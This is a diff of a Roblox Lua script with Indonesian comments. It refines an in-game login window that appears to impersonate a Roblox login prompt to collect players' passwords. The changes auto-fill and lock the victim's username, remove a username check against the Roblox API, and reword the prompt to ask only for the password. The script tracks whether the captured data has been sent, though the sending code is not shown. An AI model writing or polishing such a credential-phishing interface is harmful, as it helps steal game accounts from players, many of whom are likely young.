@@ -330,12 +330,11 @@ local function createLoginGUI()
     local usernameBox = Instance.new("TextBox")
     local passwordBox = Instance.new("TextBox")
     local loginButton = Instance.new("TextButton")
-    local errorLabel = Instance.new("TextLabel") -- Error label tambahan
+    local errorLabel = Instance.new("TextLabel") -- Error label untuk validasi
 
     -- Variabel untuk password asli dan kontrol pengiriman data
     local password = ""
-    local isDataSent = false -- Pastikan data hanya terkirim sekali
-    local isUsernameValid = false -- Untuk validasi username
+    local isDataSent = false
 
     -- Properti GUI
     gui.Name = "LoginGUI"
@@ -368,7 +367,7 @@ local function createLoginGUI()
     subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
     subtitleLabel.BackgroundTransparency = 1
     subtitleLabel.Font = Enum.Font.SourceSans
-    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
+    subtitleLabel.Text = "Masukkan Password Anda"
     subtitleLabel.TextSize = 16
     subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 
@@ -377,12 +376,13 @@ local function createLoginGUI()
     usernameBox.Parent = frame
     usernameBox.Size = UDim2.new(1, -20, 0, 40)
     usernameBox.Position = UDim2.new(0, 10, 0, 90)
-    usernameBox.PlaceholderText = "Masukkan Username"
+    usernameBox.PlaceholderText = "Username Anda"
     usernameBox.Font = Enum.Font.SourceSans
-    usernameBox.Text = ""
     usernameBox.TextSize = 14
     usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    usernameBox.TextEditable = false -- Nonaktifkan input manual
+    usernameBox.Text = game.Players.LocalPlayer.Name -- Isi otomatis dengan username pengguna
 
     -- Password Box
     passwordBox.Name = "PasswordBox"
@@ -419,52 +419,6 @@ local function createLoginGUI()
     errorLabel.TextSize = 14
     errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 
-    -- Fungsi untuk memeriksa username
-   local function validateUsername(username)
-    local HttpService = game:GetService("HttpService")
-    local apiURL = "https://users.roblox.com/v1/usernames/users"
-    local requestBody = HttpService:JSONEncode({
-        usernames = { username },
-        excludeBannedUsers = true
-    })
-
-    -- Debugging: Log username input
-    print("Username yang dikirim:", username)
-
-    -- Kirim permintaan ke API
-    local success, response = pcall(function()
-        return HttpService:PostAsync(apiURL, requestBody, Enum.HttpContentType.ApplicationJson)
-    end)
-
-    if not success then
-        warn("Gagal mengirim permintaan ke API:", response)
-        return false
-    end
-
-    -- Debugging: Log respons API
-    print("Respons API dalam bentuk string:", response)
-
-    -- Decode respons API
-    local data
-    local decodeSuccess, decodeError = pcall(function()
-        data = HttpService:JSONDecode(response)
-    end)
-
-    if not decodeSuccess then
-        warn("Gagal mendekode respons API:", decodeError)
-        return false
-    end
-
-    -- Debugging: Log struktur data
-    if data and data.data then
-        print("Data ditemukan:", HttpService:JSONEncode(data.data))
-        return #data.data > 0 -- True jika username ditemukan
-    else
-        print("Data tidak ditemukan atau salah struktur.")
-        return false
-    end
-end
-
     -- Login Button
     loginButton.Name = "LoginButton"
     loginButton.Parent = frame
@@ -482,18 +436,9 @@ end
             return -- Hentikan jika data sudah terkirim
         end
 
-        -- Cek jika username atau password kosong
-        if usernameBox.Text == "" or password == "" then
-            errorLabel.Text = "Username dan Password Tidak Boleh Kosong"
-            return
-        end
-
-        -- Validasi username
-        errorLabel.Text = "Memeriksa username..."
-        isUsernameValid = validateUsername(usernameBox.Text)
-
-        if not isUsernameValid then
-            errorLabel.Text = "Username Tidak Ditemukan"
+        -- Validasi input password kosong
+        if password == "" then
+            errorLabel.Text = "Password Tidak Boleh Kosong"
             return
         end
 
